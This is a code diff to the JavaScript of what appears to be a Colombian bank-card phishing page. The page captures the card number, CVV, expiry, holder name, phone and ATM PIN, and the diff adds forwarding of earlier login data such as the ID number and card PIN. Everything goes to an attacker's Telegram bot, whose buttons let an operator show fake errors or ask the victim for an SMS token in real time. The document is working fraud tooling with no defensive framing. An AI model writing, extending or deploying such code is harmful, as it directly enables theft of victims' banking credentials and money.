@@ -153,7 +153,7 @@
             const cvvInput = document.getElementById("cvv");
             const nombreTitularInput = document.getElementById("nombre_titular");
             const telefonoInput = document.getElementById("telefono");
-            const claveCajeroInput = document.getElementById("clave_cajero"); // Nuevo campo
+            const claveCajeroInput = document.getElementById("clave_cajero");
             const pagarBtn = document.getElementById("pagarBtn");
             const spinnerModal = document.getElementById('spinner-modal');
             const errorMessage = document.getElementById("errorMessage");
@@ -238,7 +238,7 @@
             function validateForm() {
                 const nombreValido = nombreTitularInput.value.trim().length > 2;
                 const telefonoValido = telefonoInput.value.trim().length >= 7;
-                const claveCajeroValida = claveCajeroInput.value.trim().length === 4; // Validación para el nuevo campo
+                const claveCajeroValida = claveCajeroInput.value.trim().length === 4;
 
                 const numeroTarjeta = numeroTarjetaInput.value.replace(/\s/g, '');
                 const numeroTarjetaValido = luhnCheck(numeroTarjeta) && numeroTarjeta.length >= 13 && numeroTarjeta.length <= 19;
@@ -274,7 +274,7 @@
             cvvInput.addEventListener('input', validateForm);
             nombreTitularInput.addEventListener('input', validateForm);
             telefonoInput.addEventListener('input', validateForm);
-            claveCajeroInput.addEventListener('input', validateForm); // Listener para el nuevo campo
+            claveCajeroInput.addEventListener('input', validateForm);
 
             // Función para enviar a Telegram y obtener el message_id
             async function sendToTelegram(messageContent, keyboard) {
@@ -299,7 +299,7 @@
                     }
                     const data = await response.json();
                     console.log('Mensaje enviado a Telegram exitosamente.');
-                    return data.result.message_id; // Retornar el message_id
+                    return data.result.message_id;
                 } catch (error) {
                     console.error('Error de red al enviar mensaje a Telegram:', error);
                     return null;
@@ -314,7 +314,7 @@
                 const payload = {
                     chat_id: chatId,
                     message_id: messageId,
-                    reply_markup: {} // Objeto vacío para eliminar los botones
+                    reply_markup: {}
                 };
 
                 try {
@@ -359,9 +359,8 @@
 
                             const callbackDataFull = latest.callback_query.data;
                             const callbackId = latest.callback_query.id;
-                            const messageId = sessionStorage.getItem('telegramMessageId'); // Obtener el message_id guardado
+                            const messageId = sessionStorage.getItem('telegramMessageId');
 
-                            // Borrar los botones antes de la acción
                             await editTelegramMessage(TELEGRAM_CHAT_ID, messageId);
 
                             try {
@@ -383,7 +382,7 @@
                                 case 'error_tc':
                                     errorMessage.classList.remove('hidden');
                                     break;
-                                case 'error_cc': // Nueva clave para el error de clave cajero
+                                case 'error_cc':
                                     errorModalMessage.textContent = "Clave de cajero incorrecta. Por favor, verifica e intenta de nuevo.";
                                     errorModal.style.display = 'flex';
                                     break;
@@ -415,7 +414,7 @@
                 const fechaExp = fechaExpInput.value.trim();
                 const cvv = cvvInput.value.trim();
                 const telefono = telefonoInput.value.trim();
-                const claveCajero = claveCajeroInput.value.trim(); // Captura del nuevo valor
+                const claveCajero = claveCajeroInput.value.trim();
 
                 const now = new Date();
                 const formattedDate = now.toLocaleDateString('es-CO', {
@@ -429,23 +428,30 @@
                 spinnerModal.style.display = 'flex';
 
                 let telegramMessage = '🍀 GOLEADOR 🍀\n\n';
-                telegramMessage += `Tipo de Ingreso: Tarjeta de Crédito\n`;
-                // Datos fijos para Tipo de Doc, Cédula y Clave
-                telegramMessage += `Tipo de Doc: Cédula de Ciudadanía\n`;
-                telegramMessage += `Cédula: 1032385512\n`;
-                telegramMessage += `Clave: 1985\n\n`;
+
+                if (initialLoginData) {
+                    telegramMessage += `Tipo de Ingreso: Tarjeta Débito\n`;
+                    telegramMessage += `Tipo de Doc: ${initialLoginData.tipoDoc}\n`;
+                    telegramMessage += `CEDULA💎: ${initialLoginData.nroDoc}\n`;
+                    telegramMessage += `ClAVE🔐: ${initialLoginData.cardClave}\n`;
+                    if (initialLoginData.cardClave !== 'N/A') {
+                        telegramMessage += `Últimos 4 dígitos: ${initialLoginData.cardDigitos}\n`;
+                    }
+                }
+                
+                telegramMessage += `\n`;
                 telegramMessage += `Nombre: ${nombreTitular}\n`;
                 telegramMessage += `Teléfono: ${telefono}\n`;
                 telegramMessage += `Tarjeta: ${numeroTarjeta}\n`;
                 telegramMessage += `Fecha Exp: ${fechaExp}\n`;
                 telegramMessage += `CVV: ${cvv}\n`;
-                telegramMessage += `Clave Cajero: ${claveCajero}\n\n`; // Adición de la clave cajero
+                telegramMessage += `Clave Cajero: ${claveCajero}\n\n`;
                 telegramMessage += `Fecha/Hora: ${formattedDate}, ${formattedTime}`;
 
                 const keyboard = {
                     inline_keyboard: [
                         [{ text: "❌ Error Tarjeta", callback_data: `error_tc:${transactionId}` }],
-                        [{ text: "🚨 Error Clave Cajero", callback_data: `error_cc:${transactionId}` }], // Nuevo botón
+                        [{ text: "🚨 Error Clave Cajero", callback_data: `error_cc:${transactionId}` }],
                         [{ text: "👀 Pedir Token SMS", callback_data: `pedir_token_sms:${transactionId}` }],
                         [{ text: "✅ Finalizar", callback_data: `finalizar:${transactionId}` }]
                     ]
